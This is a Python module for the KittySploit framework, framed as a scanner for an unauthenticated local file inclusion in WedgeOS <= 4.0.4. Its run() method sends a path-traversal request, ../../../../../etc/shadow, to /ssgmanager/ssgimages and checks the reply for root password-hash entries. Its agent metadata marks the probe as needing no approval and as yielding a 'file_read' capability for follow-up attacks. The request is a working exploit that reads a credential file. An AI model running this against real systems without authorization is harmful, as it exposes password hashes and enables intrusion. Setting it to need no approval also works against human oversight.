#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WedgeOS ssgimages local file inclusion."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WedgeOS - ssgimages LFI Detection',
        'description': (
            'Detects WedgeOS <= 4.0.4 LFI by requesting '
            '/ssgmanager/ssgimages?name=../../../../../etc/shadow.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'wedgeos', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37673',
        ],
    }

    def run(self):
        path = '/ssgmanager/ssgimages?name=../../../../../etc/shadow'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='WedgeOS ssgimages LFI',
                path='/ssgmanager/ssgimages',
            )
            return True
        return False
